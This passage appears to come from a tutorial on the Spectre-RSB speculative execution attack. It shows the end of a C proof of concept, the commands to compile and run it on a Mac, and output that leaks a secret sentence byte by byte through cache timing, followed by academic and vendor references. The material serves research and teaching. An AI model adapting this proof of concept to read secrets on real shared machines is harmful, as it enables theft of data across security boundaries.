            printf("( second best: 0x%02X score=%-4d)", value[1], score[1]);
        }
        printf("\n");
    }
    return 0;
}
```

Compile the program and run it on my Mac machine:
```console
$ gcc -march=native -O0 spectre-rsb.c -o spectre-rsb
$ ./spectre-rsb
CACHE_HIT_THRESHOLD is calculated as 44
Reading 43 bytes:
Reading at secret = 0x10ce24ed8... Unclear: 0x00='?' score=915  ( second best: 0x4F score=898 )
Reading at secret = 0x10ce24ed9... Unclear: 0x6E='n' score=919  ( second best: 0x00 score=895 )
Reading at secret = 0x10ce24eda... Unclear: 0x20=' ' score=971  ( second best: 0x00 score=968 )
Reading at secret = 0x10ce24edb... Unclear: 0x74='t' score=991  ( second best: 0x00 score=970 )
Reading at secret = 0x10ce24edc... Unclear: 0x68='h' score=993  ( second best: 0x00 score=969 )
Reading at secret = 0x10ce24edd... Unclear: 0x65='e' score=959  ( second best: 0x00 score=952 )
Reading at secret = 0x10ce24ede... Unclear: 0x20=' ' score=973  ( second best: 0x00 score=973 )
Reading at secret = 0x10ce24edf... Unclear: 0x62='b' score=975  ( second best: 0x00 score=967 )
Reading at secret = 0x10ce24ee0... Unclear: 0x6F='o' score=975  ( second best: 0x00 score=974 )
Reading at secret = 0x10ce24ee1... Unclear: 0x6E='n' score=961  ( second best: 0x00 score=956 )
Reading at secret = 0x10ce24ee2... Unclear: 0x6E='n' score=922  ( second best: 0x00 score=871 )
Reading at secret = 0x10ce24ee3... Unclear: 0x69='i' score=995  ( second best: 0x00 score=976 )
Reading at secret = 0x10ce24ee4... Unclear: 0x00='?' score=957  ( second best: 0x65 score=940 )
Reading at secret = 0x10ce24ee5... Unclear: 0x2C=',' score=959  ( second best: 0x00 score=958 )
Reading at secret = 0x10ce24ee6... Unclear: 0x20=' ' score=957  ( second best: 0x00 score=957 )
Reading at secret = 0x10ce24ee7... Unclear: 0x62='b' score=955  ( second best: 0x00 score=934 )
Reading at secret = 0x10ce24ee8... Unclear: 0x6F='o' score=949  ( second best: 0x00 score=945 )
Reading at secret = 0x10ce24ee9... Unclear: 0x6E='n' score=937  ( second best: 0x00 score=924 )
Reading at secret = 0x10ce24eea... Unclear: 0x6E='n' score=938  ( second best: 0x00 score=921 )
Reading at secret = 0x10ce24eeb... Unclear: 0x69='i' score=980  ( second best: 0x00 score=933 )
Reading at secret = 0x10ce24eec... Unclear: 0x00='?' score=934  ( second best: 0x65 score=928 )
Reading at secret = 0x10ce24eed... Unclear: 0x00='?' score=940  ( second best: 0x20 score=930 )
Reading at secret = 0x10ce24eee... Unclear: 0x62='b' score=925  ( second best: 0x00 score=903 )
Reading at secret = 0x10ce24eef... Unclear: 0x61='a' score=927  ( second best: 0x00 score=912 )
Reading at secret = 0x10ce24ef0... Unclear: 0x6E='n' score=921  ( second best: 0x00 score=910 )
Reading at secret = 0x10ce24ef1... Unclear: 0x6B='k' score=834  ( second best: 0x00 score=566 )
Reading at secret = 0x10ce24ef2... Unclear: 0x73='s' score=928  ( second best: 0x00 score=615 )
Reading at secret = 0x10ce24ef3... Unclear: 0x00='?' score=901  ( second best: 0x20 score=898 )
Reading at secret = 0x10ce24ef4... Unclear: 0x6F='o' score=747  ( second best: 0x00 score=674 )
Reading at secret = 0x10ce24ef5... Success: 0x00='?' score=1    
Reading at secret = 0x10ce24ef6... Unclear: 0x20=' ' score=916  ( second best: 0x00 score=901 )
Reading at secret = 0x10ce24ef7... Unclear: 0x4C='L' score=958  ( second best: 0x00 score=934 )
Reading at secret = 0x10ce24ef8... Unclear: 0x6F='o' score=941  ( second best: 0x00 score=936 )
Reading at secret = 0x10ce24ef9... Unclear: 0x63='c' score=886  ( second best: 0x00 score=854 )
Reading at secret = 0x10ce24efa... Unclear: 0x68='h' score=973  ( second best: 0x00 score=725 )
Reading at secret = 0x10ce24efb... Unclear: 0x20=' ' score=791  ( second best: 0x00 score=754 )
Reading at secret = 0x10ce24efc... Unclear: 0x4C='L' score=906  ( second best: 0x00 score=884 )
Reading at secret = 0x10ce24efd... Unclear: 0x6F='o' score=807  ( second best: 0x00 score=780 )
Reading at secret = 0x10ce24efe... Unclear: 0x6D='m' score=847  ( second best: 0x00 score=762 )
Reading at secret = 0x10ce24eff... Unclear: 0x6F='o' score=862  ( second best: 0x00 score=849 )
Reading at secret = 0x10ce24f00... Unclear: 0x6E='n' score=866  ( second best: 0x00 score=814 )
Reading at secret = 0x10ce24f01... Unclear: 0x64='d' score=890  ( second best: 0x00 score=866 )
Reading at secret = 0x10ce24f02... Unclear: 0x2E='.' score=907  ( second best: 0x00 score=900 )
```

## References

[^1]: Colin Percival, "Cache Missing for Fun and Profit," In *BSDCan 2005*, Ottawa, CA, 2005.

[^2]: Matt Miller, "Mitigating Speculative Execution Side Channel Hardware Vulnerabilities," [https://msrc-blog.microsoft.com/2018/03/15/mitigating-speculative-execution-side-channel-hardware-vulnerabilities/](https://msrc-blog.microsoft.com/2018/03/15/mitigating-speculative-execution-side-channel-hardware-vulnerabilities/), March 15, 2018.

[^3]: Daniel J. Bernstein, "Cache-Timing Attacks on AES," [https://cr.yp.to/antiforgery/cachetiming-20050414.pdf](https://cr.yp.to/antiforgery/cachetiming-20050414.pdf), April 2005.

[^4]: David Gullasch, Endre Bangerter, and Stephen Krenn, "Cache Games &mdash; Bringing Access-Based Cache Attacks on AES to Practice," In *2011 IEEE Symposium on Security and Privacy*, May 22-25, 2011, Oakland, CA, USA.

[^5]: [Eran Tromer](http://www.cs.tau.ac.il/~tromer/cache/), Dag Arne Osvik, and Adi Shamir, "Efficient Cache Attacks on AES, and Countermeasures," *Journal of Cryptology*, Vol. 23, No. 1, 37-71, Springer, 2010.

[^6]: Fangfei Liu, Yuval Yarom, Qian Ge, Gernot Heiser, Ruby B. Lee, "Last-Level Cache Side-Channel Attacks are Practical," In *2015 IEEE Symposium on Security and Privacy*, May 17-21, 2015, San Jose, CA, USA.

[^7]: Gorka Irazoqui, Thomas Eisenbarth, and Berk Sunar, "S&dollar;A: A Shared Cache Attack that Works Across Cores and Defies VM Sandboxing &mdash;&mdash; and its Application to AES," In *2015 IEEE Symposium on Security and Privacy*, May 17-21, 2015, San Jose, CA, USA.

[^8]: Yuval Yarom and Katrina Falkner, "Flush+Reload: A High Resolution, Low Noise, L3 Cache Side-Channel Attack," In *Proceedings of the 23rd USENIX Security Symposium*, August 20-22, 2014, San Diego, CA, USA.

[^9]: Jann Horn, Google Project Zero, "Reading Privileged Memory with a Side-Channel," [https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html).

[^10]: Tao Zhang, Kenneth Koltermann, and Dmitry Evtyushkin, "Exploring Branch Predictors for Constructing Transient Execution Trojans," In *ASPLOS'20: Proceedings of the Twenty-Fifth International Conference on Architectural Support for Programming Languages and Operating Systems*, March 16-20, 2020, Lausanne, Switzerland.

[^11]: Nadav Amit, Fred Jacobs, and Michael Wei, "JumpSwitches: Restoring the Performance of Indirect Branches in the Era of Spectre," In *Proceedings of the 2019 USENIX Annual Technical Conference*, July 10-12, 2019, Renton, WA, USA.

[^12]: Dmitry Evtyushkin, Dmitry Ponomarev, and Nael Abu-Ghazaleh, "Jump over ASLR: Attacking Branch Predictors to Bypass ASLR," In *2016 49th Annual IEEE/ACM International Symposium on Microarchitecture (MICRO)*, October 15-19, 2016, Taipei, Taiwan, China.

[^13]: Return Stack Buffer Underflow / CVE-2022-29901, CVE-2022-28693 / INTEL-SA-00702, [https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/return-stack-buffer-underflow.html](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/return-stack-buffer-underflow.html).

[^14]: Esmaeil Mohammadian Koruyeh, Khaled N. Khasawneh, Chengsu Song, and Nael Abu-Ghazaleh, "Spectre Returns! Speculation Attacks Using the Return Stack Buffer," *WOOT'18: Proceedings of the 12th USENIX Conference on Offensive Technologies*, August 2018.